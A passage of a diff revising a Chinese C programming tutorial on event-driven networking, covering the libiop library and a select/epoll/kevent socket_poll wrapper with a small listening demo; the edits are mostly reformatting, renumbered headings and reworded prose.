-			iop->sbuf->len = 0;
-		else
-			tstr_popup(iop->sbuf, n);
-	}
+        if (n >= (int)iop->sbuf->len)
+            iop->sbuf->len = 0;
+        else
+            tstr_popup(iop->sbuf, n);
+    }
 
-	// 超时时间处理
-	if (events & EV_TIMEOUT) {
-		r = sarg->ferror(base, id, EV_TIMEOUT, arg);
-		if (r < SufBase)
-			return r;
-	}
+    // 超时时间处理
+    if (events & EV_TIMEOUT) {
+        r = sarg->ferror(base, id, EV_TIMEOUT, arg);
+        if (r < SufBase)
+            return r;
+    }
 
-	return SufBase;
+    return SufBase;
 }
 ```
 
     调度函数中主要围绕各种事件的处理. EV_READ, EV_WRITE ... 
     只要是基于注册的网络库基本都是上面套路. 外加上一些杂糅的语言层面的特性.
-    到这里哪怕是看天书, 但你要明白, 你所要的底层也就这样了....
+    到这里哪怕是看天书, 但要明白, 你所要的底层也就这样了....
 
 ### 7.5.4 libiop 不如来个 Heoo
 
@@ -4605,7 +4610,7 @@ static int _fdispatch(iopbase_t base, uint32_t id, uint32_t events, void * arg) 
 main.c
 
 ```C
-#include <iop_server.h>
+#include "iop_server.h"
 
 #define _STR_IP         "127.0.0.1"
 #define _SHORT_PORT     (8088)
@@ -4755,32 +4760,31 @@ echo_client(void) {
 
 ![libiopunix测试](./img/libiopunix测试.png)
 
-    到这里关于 libiop 基于注册的网络库开发的流水账记录完毕了. 到这里只需要记得
-    通过基础 socket api 可以通过注册, 能够写库就够了. 
-    不妨扯一点, 单纯而言写个系统完整的库还是有点挑战的, 但有个小方法那就是. 每
-    各大库都会细化成几个细节, 我们可以随便找个简单的细节自己修炼出来. 多了之后
-    时间久了你追求的库就出来了. 
+    到这里关于 libiop 基于注册的网络库开发的流水账记录完毕了. 目前只需要记得通过
+    基础 socket api 可以通过注册, 能够写库就够了. 不妨扯一点, 单纯而言写个系统完
+    整的库还是有点挑战的, 但有个小方法那就是. 每个大库都会细化成几个细节, 我们可以
+    随便找个简单的细节自己修炼出来. 多了之后, 时间久了你追求的库就出来了. 
 
     到这强行突破金丹, 以后就是时间疯狂打磨. 十年磨一剑, 霜刃未曾试 ~
     原本关于 C 修炼到这里, 是完工了, 因为世间套路都抵不过时间, 用心去封装 ~
 
-    也许重新上路, 带上你的剑 ---88--
+    也许再一次重新求索, 带上你的剑 ---88--
 
 ## 7.6 server poll 一股至强的气息
 
-    很久以前幻想这能和那些 元婴大佬, 化神真君御剑飞行, 一步千里. (现在还在幻想)
-    偶幸得到一部元婴功法, 分享参悟, 说不行江湖下次就留下你的传说 ~
+    很久以前幻想着能和那些 元婴大佬, 化神真君一样御剑飞行, 一步千里. (现在还在幻
+    想) 偶幸得到一部元婴功法, 分享参悟, 说不定江湖中下次会留下你的传说 ~
 
     基于注册的套路, 真的和吃屎一样来回绕. 何必呢, 用的了那么纠缠吗. 倒不如从
     底层分层依次冒上来, 最终来个元气弹. 
 
     最后一招, 在这元气稀薄的大陆哈哈, 元婴灭世, ta 给你你要的一切 ~
 
-## 7.6 server poll 文件描述符监测
+### 7.6.1 server poll 文件描述符监测
 
-    从 select , poll, epoll, iocp, kevent 这一切的一切到底经历过什么. 当然这些
-    有着相似的接口, 何不一块来个接口统一封装呢. 这里有你满足的一切. 不妨看下面完
-    整接口. 
+    从 select , poll, epoll, iocp, kevent 这一切的一切到底经历过什么. 当然这
+    些有着相似的接口, 何不一块来个接口统一封装呢. 这里有你满足的一切. 不妨看下面
+    完整接口. 
 
 ```C
 #ifndef _H_SIMPLEC_SOCKET_POLL
@@ -4832,12 +4836,13 @@ extern int sp_wait(poll_t sp, struct event e[], int max);
 ```
 
     首先明确一点, 这套库主打 unix / linux. 当初那个化神前辈只写了个 unix kevent, 
-    linux epoll 部分. 后面为了跨平台主动加了 winds select 实现. 方便测试监测. 
+    linux epoll 部分. 后面为了方便 CL Debug 主动加了 winds select 实现. 方便测
+    试监测. 
     
-### 7.6.1 select 实现
+### 7.6.2 select 实现
 
     有了上面 socket_poll 接口定义, 我们开始搞起 ~
-    先来个 winds 实现, 基于 select 接口设计出我们要的接口
+    先来个 winds 实现, 基于 select 按照上面接口标准设计出我们要的
 
 socket_poll$select.h
 
@@ -4860,11 +4865,6 @@ struct select_poll {
 	struct sevent evs[FD_SETSIZE];
 };
 
-//
-// sp_create	- 创建一个poll模型
-// sp_invalid	- 检查这个poll模型是否有问题, true表示有问题
-// sp_delete	- 销毁这个poll模型
-//
 inline poll_t 
 sp_create(void) {
 	return calloc(1, sizeof(struct select_poll));
@@ -4880,11 +4880,6 @@ sp_delete(poll_t sp) {
 	free(sp);
 }
 
-//
-// sp_add		- 添加监测的socket, 并设置读模式, 失败返回true
-// sp_del		- 删除监测的socket
-// sp_write		- 修改当前socket, 并设置为写模式
-//
 bool 
 sp_add(poll_t sp, socket_t sock, void * ud) {
 	struct sevent * sev, * eev;
@@ -4935,13 +4930,6 @@ sp_write(poll_t sp, socket_t sock, void * ud, bool enable) {
 	}
 }
 
-//
-// sp_wait		- poll 的 wait函数, 等待别人自投罗网
-// sp		: poll 模型
-// e		: 返回的操作事件集
-// max		: e 的最大长度
-// return	: 返回待操作事件长度, <= 0 表示失败
-//
 int 
 sp_wait(poll_t sp, struct event e[], int max) {
 	int r, i, n, retn;
@@ -4991,24 +4979,19 @@ sp_wait(poll_t sp, struct event e[], int max) {
     验证机制. 当你学习到这里我希望你能够明白这些代码的意义了. 因为不是个让你入门的解
     释. 而是让你理解了套路, 能够立即为线上框架贡献代码的思路.
 
-### 7.6.2 epoll 实现
+### 7.6.3 epoll 实现
 
-    其实这套接口最大的服务对象就是 linux poll 接口统一封装. 所以 epoll 封装起来特别
-    顺手. 核心很短
+    其实这套接口最大的服务对象就是 linux 服务器. 所以 epoll 封装起来特别顺手. 核心
+    很短
 
 socket_poll$epoll.h
 
 ```C
 #if defined(__linux__)
 
-#include <socket_poll.h>
+#include "socket_poll.h"
 #include <sys/epoll.h>
 
-//
-// sp_create	- 创建一个poll模型
-// sp_invalid	- 检查这个poll模型是否有问题, true表示有问题
-// sp_delete	- 销毁这个poll模型
-//
 inline poll_t 
 sp_create(void) {
 	return epoll_create1(0);
@@ -5024,11 +5007,6 @@ sp_delete(poll_t sp) {
 	close(sp);
 }
 
-//
-// sp_add		- 添加监测的socket, 并设置读模式, 失败返回true
-// sp_del		- 删除监测的socket
-// sp_write		- 修改当前socket, 并设置为写模式
-//
 inline bool 
 sp_add(poll_t sp, socket_t sock, void * ud) {
 	struct epoll_event ev = { EPOLLIN };
@@ -5049,13 +5027,6 @@ sp_write(poll_t sp, socket_t sock, void * ud, bool enable) {
 	epoll_ctl(sp, EPOLL_CTL_MOD, sock, &ev);
 }
 
-//
-// sp_wait		- poll 的 wait函数, 等待别人自投罗网
-// sp		: poll 模型
-// e		: 返回的操作事件集
-// max		: e 的最大长度
-// return	: 返回待操作事件长度, <= 0 表示失败
-//
 int 
 sp_wait(poll_t sp, struct event e[], int max) {
 	struct epoll_event ev[max];
@@ -5075,35 +5046,29 @@ sp_wait(poll_t sp, struct event e[], int max) {
 #endif
 ```
 
-    sp_wait -> epoll_wait 之后开始 read, write, error 判断. 其中对于 EPOLLHUP 解释是
-    当 socket 的一端认为对方发来了一个不存在的4元组请求的时候, 会回复一个 RST 响应, 在
-    epoll 上会响应为 EPOLLHUP 事件, 目前查资料已知的两种情况会发响应 RST. 
+    sp_wait -> epoll_wait 之后开始 read, write, error 判断. 其中对于 EPOLLHUP 解释
+    是当 socket 的一端认为对方发来了一个不存在的4元组请求的时候, 会回复一个 RST 响应, 
+    在 epoll 上会响应为 EPOLLHUP 事件, 目前查资料已知的两种情况会发响应 RST. 
         [1] 当客户端向一个没有在listen的服务器端口发送的connect的时候服务器会返回一个
             RST 因为服务器根本不知道这个4元组的存在 
         [2] 当已经建立好连接的一对客户端和服务器, 客户端突然操作系统崩溃, 或者拔掉电源
-            导致操作系统重新启动(kill pid或者正常关机不行的, 因为操作系统会发送 FIN 给对
-            方). 这时服务器在原有的4元组上发送数据, 会收到客户端返回的 RST, 因为客户端根
-            本不知道之前这个4元组的存在
-
+            导致操作系统重新启动(kill pid或者正常关机不行的, 因为操作系统会发送 FIN 给
+            对方). 这时服务器在原有的4元组上发送数据, 会收到客户端返回的 RST, 因为客户
+            端根本不知道之前这个4元组的存在
     这么做的原因是能够让下一次 read 返回 -1, 监测出 error, 走 close 操作.
 
-### 7.6.3 kevent 实现
+### 7.6.4 kevent 实现
 
-    对于 kevent unix poll 封装, 纯属抄袭. 没有亲自测试, 有兴趣的可以尝试使用.
+    对于 kevent unix poll 封装, 纯属复制. 没有亲自测试, 有兴趣的可以尝试使用.
 
 socket_poll$kevent.h
 
 ```C
 #if defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__) || defined (__NetBSD__)
 
-#include <socket_poll.h>
+#include "socket_poll.h"
 #include <sys/event.h>
 
-//
-// sp_create	- 创建一个poll模型
-// sp_invalid	- 检查这个poll模型是否有问题, true表示有问题
-// sp_delete	- 销毁这个poll模型
-//
 inline poll_t
 sp_create(void) {
 	return kqueue();
@@ -5119,11 +5084,6 @@ sp_delete(poll_t sp) {
 	close(sp);
 }
 
-//
-// sp_add		- 添加监测的socket, 并设置读模式, 失败返回true
-// sp_del		- 删除监测的socket
-// sp_write		- 修改当前socket, 并设置为写模式
-//
 bool
 sp_add(poll_t sp, socket_t sock, void * ud) {
 	struct kevent ke;
@@ -5163,13 +5123,6 @@ sp_write(poll_t sp, socket_t sock, void * ud, bool enable) {
 	}
 }
 
-//
-// sp_wait		- poll 的 wait函数, 等待别人自投罗网
-// sp		: poll 模型
-// e		: 返回的操作事件集
-// max		: e 的最大长度
-// return	: 返回待操作事件长度, <= 0 表示失败
-//
 int
 sp_wait(poll_t sp, struct event e[], int max) {
 	struct kevent ev[max];
@@ -5188,11 +5141,21 @@ sp_wait(poll_t sp, struct event e[], int max) {
 #endif
 ```
 
-    到这里关于 socket_poll 模型在不同平台上已经实现了. 我们不妨写个测试 demo
+    到这里关于 socket_poll 模型在不同平台上已经实现了. 
 
-### 7.6.4 poll demo
+socket_poll.c    
 
-    不妨看下面
+```C
+#include "socket_poll$epoll.h"
+#include "socket_poll$kevent.h"
+#include "socket_poll$select.h"
+```    
+
+    到这里不妨写个测试 demo
+
+### 7.6.5 poll demo
+
+    不妨看下面, 监听 socket connect 过来, 
 
 ```C
 #include "socket_poll.h"
@@ -5204,30 +5167,30 @@ sp_wait(poll_t sp, struct event e[], int max) {
 // https://github.com/cloudwu/skynet/blob/master/skynet-src/socket_poll.h
 //
 void test_socket_poll(void) {
-	int n;
-	poll_t poll;
-	socket_t sock;
-	struct event evs[FD_SETSIZE];
+    int n;
+    poll_t poll;
+    socket_t sock;
+    struct event evs[FD_SETSIZE];
 
-	// 开始构建一个 socket
-	sock = socket_tcp(NULL, _USHORT_PORT);
-	if (sock == INVALID_SOCKET)
-		return;
+    // 开始构建一个 socket
+    sock = socket_tcp(NULL, _USHORT_PORT);
+    if (sock == INVALID_SOCKET)
+        return;
 
-	poll = sp_create();
-	assert(!sp_invalid(poll));
+    poll = sp_create();
+    assert(!sp_invalid(poll));
 
-	if (sp_add(poll, sock, NULL))
-		CERR("sp_add sock = is error!");
-	else {
-		// 开始等待数据
-		printf("sp_wait [127.0.0.1:%hu] listen ... \n", _USHORT_PORT);
-		n = sp_wait(poll, evs, LEN(evs));
-		printf("sp_wait n = %d. 一切都是那么意外!\n", n);
-	}
+    if (sp_add(poll, sock, NULL))
+        CERR("sp_add sock = is error!");
+    else {
+        // 开始等待数据
+        printf("sp_wait [127.0.0.1:%hu] listen ... \n", _USHORT_PORT);
+        n = sp_wait(poll, evs, LEN(evs));
+        printf("sp_wait n = %d. 一切都是那么意外!\n", n);
+    }
 
     sp_delete(poll);
-	socket_close(sock);
+    socket_close(sock);
 }
 ```
 
